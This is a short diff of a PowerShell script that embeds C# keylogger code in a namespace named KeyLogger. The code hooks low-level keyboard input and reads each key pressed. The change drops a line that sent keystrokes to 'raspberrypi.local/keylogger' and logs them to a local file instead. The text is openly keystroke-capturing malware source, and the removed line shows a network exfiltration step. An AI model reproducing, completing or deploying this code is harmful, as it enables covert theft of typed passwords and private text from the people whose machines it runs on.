@@ -1,8 +1,6 @@
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
-using System.Text;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -37,8 +35,7 @@ namespace KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
         int vkCode = Marshal.ReadInt32(lParam);
-        string URL = "raspberrypi.local/keylogger";
-        System.Net.WebRequest webRequest = System.Net.WebRequest.Create(URL);
+        logFile.WriteLine((Keys)vkCode);
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
